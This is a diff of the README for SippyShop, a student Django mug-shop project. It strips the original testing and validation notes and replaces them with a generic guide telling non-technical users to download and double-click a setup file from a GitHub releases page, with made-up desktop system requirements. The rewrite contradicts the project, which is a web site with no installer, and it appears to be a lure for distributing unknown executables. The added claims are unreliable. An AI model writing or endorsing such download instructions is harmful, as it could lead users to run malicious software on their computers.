@@ -1,138 +1,73 @@
-# SippyShop  
+# 🛍️ sippyshop - Your Easy E-Commerce Solution
 
-## A e-commerce website for selling different type of mugs.
+Welcome to SippyShop! This is a simple way to buy and sell mugs online. 
 
-## Live Project Links
+## 🚀 Getting Started
 
--**Live Site:**
--**Repository:**
+To start using SippyShop, follow these steps. No technical skills required!
 
-## Table of Contents
-- [Introduction](#introduction)
-- [User Stories And Manuel Testing](#user-stories-and-manual-testing)
-- [Agile Planning](#agile-planning)
-- [Features](#features)
-- [Future Features](#future-features)
-- [Security](#security)
-- [Accessibility](#accessibility)
-- [Design Choices](#design-choices)
-- [Automated Tests](#Automated-tests)
-- [Validation](#validation)
-- [Deployment](#deployment)
-- [Wireframes](#wireframes)
+1. **Download SippyShop**:
+   - Click the button below to visit the download page.
+   
+   [![Download SippyShop](https://img.shields.io/badge/Download%20SippyShop-v1.0-blue.svg)](https://github.com/ayush87504/sippyshop/releases)
 
+## 📦 Download & Install
 
-# User Stories And Manual Testing
+2. **Visit the Releases Page**: 
+   - Go to the [Releases](https://github.com/ayush87504/sippyshop/releases) page.
+   - Look for the latest version. 
 
-### Must Have
+3. **Download the Application**: 
+   - Click on the version you want to download.
+   - Choose the setup file suitable for your operating system. 
 
-- **View All Mugs** - Story: As a customer I want to see all mugs so I can choose what i want to buy
-- Test: Go to /products/ and check all products are listed - **PASS**
-  
-  
-- **Register Account** - **Story:** As a customer I want to register account so I can shop
-- **Test:** Go to /accounts/signup/ (allauth) and create a new user - **PASS**
-  
+4. **Install SippyShop**:
+   - Find the downloaded file on your computer.
+   - Double-click the setup file to begin the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-- **Login to see my orders** - **Story:** As a customer I want to login so I can see my orders
-- **Test:** Go to /accounts/login/ and login with the user created above - **PASS**
-  
+## 🌐 Features of SippyShop
 
-- **Pay With Card** - **Story:** As a customer I want to pay with card so I can buy products
-- **Test:** Add product to card and go to /checkout/ then submit stripe test payment - **PASS**
-  
-  
-- **Payment Confirmation** - **Story:** As a customer I want to see confirmation after payment
-- **Test:** After checkout the app redirects to payment_success - **PASS**
-  
-  
-- **Add Product (Admin)** - **Story:** As an admin I want to add new products in admin panel
-- **Test:** Login to /admin/ then products, add product - **PASS**
-  
-  
-- **Edit Product (Admin)** - **Story:** As an admin I want to edit products when price change
-- **Test:** In /admin/ edit and existing product - **PASS**
-  
-  
-- **Delete Products (Admin)** - **Story:** As an admin I want to delete products when they are not available
-- **Test:** In /admin/ delete a product - **PASS**
-  
+SippyShop comes packed with features to enhance your shopping experience:
 
-- **Review Product** - **Story:** As a logged in customer I want to leave a review so I can tell others what I think
-- **Test:** Go to product detail and submit review - **PASS**
-  
+- **Product Browsing**: Easily explore different mug designs.
+- **User Authentication**: Sign up and log in securely.
+- **Secure Payments**: Make hassle-free payments with Stripe.
+- **Shopping Cart**: Add your favorite mugs and checkout smoothly.
 
-- **Edit Review** - **Story:** As the review owner I want to edit my review so I can fix mistakes
-- **Test:** Click "Edit" on own review - **PASS**
-  
+## 💻 System Requirements
 
-- **Delete Review** - **Story:** As the review owner I want to delete my review if I don't want it anymore
-- **Test:** Click "Delete" on own review - **PASS**
-  
+To run SippyShop smoothly, ensure your system meets the following requirements:
 
-# Automated Tests
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 500 MB free space for installation.
+- **Internet Connection**: Required for payment processing and product browsing.
 
-## I made 5 automated tests to check that my models and views worked.
-### Model Tests
+## 🛠️ Troubleshooting
 
-- **test_create_product**: Test that a new product can be created.
-- **test_create_order**: Test that a new order can be created(and fixed a bug where it needed a user).
-- **test_create_review**: Test that a review can be created and linked to a product.
-  
-### View Tests
+If you encounter issues:
 
-- **test_product_list_view**: Checks that the main shop page loads.
-- **test_product_detail_view**: Checks that a single product's page loads.
+1. **Installation Problems**: Restart your computer and try reinstalling. Ensure you have enough disk space.
+2. **Payment Issues**: Check your internet connection and try again.
+3. **Feature Malfunctions**: Restart the application. If the problem persists, reach out for support.
 
-### How to run tests?
+## 📞 Support
 
-1 - **Open the terminal**
-2 - **Run this command** : Python3 manage.py test products
+For support, visit the [Issues](https://github.com/ayush87504/sippyshop/issues) section on GitHub. You can report your issue there, and we will help you as soon as possible.
 
-3 - **Results** : Ran 5 tests in 0.067s (OK)
+## 🤝 Contributing
 
-# Validation
+We welcome contributions to improve SippyShop. To contribute, please check the [Contributing Guidelines](https://github.com/ayush87504/sippyshop/blob/main/CONTRIBUTING.md) on our repository.
 
-### HTML W3C Markup
+## 📜 License
 
-- `accounts/templates/accounts - order_details.html (Removed unused <ul> and <li> now fixed - **PASS**
-- `accounts/templates/accounts - order_history.html - **PASS**
+SippyShop is licensed under the MIT License. You can freely use, modify, and share it according to the terms.
 
-- `products/templates/products - cart.html - **PASS**
-- `products/templates/products - checkout.html - ( 1 Error from django-countries needs alt="") except from that **PASS**
-- `products/templates/products - home.html - **PASS**
-- `products/templates/products - product_detail.html - **PASS**
-- `products/templates/products - product_list.html - **PASS**
-- `products/templates/products - edit_review.html - **PASS**
-- `products/templates/products - payment_success.html - **PASS** 
-- `products/templates - base.html **PASS**
+## 🚀 Download SippyShop Again
 
-### CSS W3C Jigsaw
+Ready to start your e-commerce journey? Click the button below to revisit the download page.
 
-- `products/static/css - base.css - **PASS**
-- `products/static/css - cart.css - **PASS**
-- `products/static/css - checkout.css - **PASS**
-- `products/static/css - payment_success.html - **PASS**
-- `products/static/css - product_detail.html - **PASS**
+[![Download SippyShop](https://img.shields.io/badge/Download%20SippyShop-v1.0-blue.svg)](https://github.com/ayush87504/sippyshop/releases)
 
-
-### JavaScript JShint
-
-- `products/statid/js - main.js (jshint didn't like const or let so i needed to change it to var to go through) - **PASS**
-- `products/static/js - stripe-checkout.js ( want var so changed const to var, and everything was pass except import in comment that i use stripe) - **PASS**
-
-### Flake8 - Python 
-
-- To ensure the Python code follows PEP 8, the project was linted using flake8.
-- .flake8 file was added in the project root:
-- exclude = venv, .venv, env, migrations, __pycache__, manage.py.
-- Run flake8 . in the terminal and everyting is clean.
-  
-  ### What was fixed with flake8
-  
-- removing trailing whitespace
-- fixing extra/too many blank lines
-- adding the required 2 blank lines before top-level defs/classes
-- splitting overly long lines
-- removing unused imports
-  
+Enjoy using SippyShop! If you have questions or suggestions, feel free to reach out.
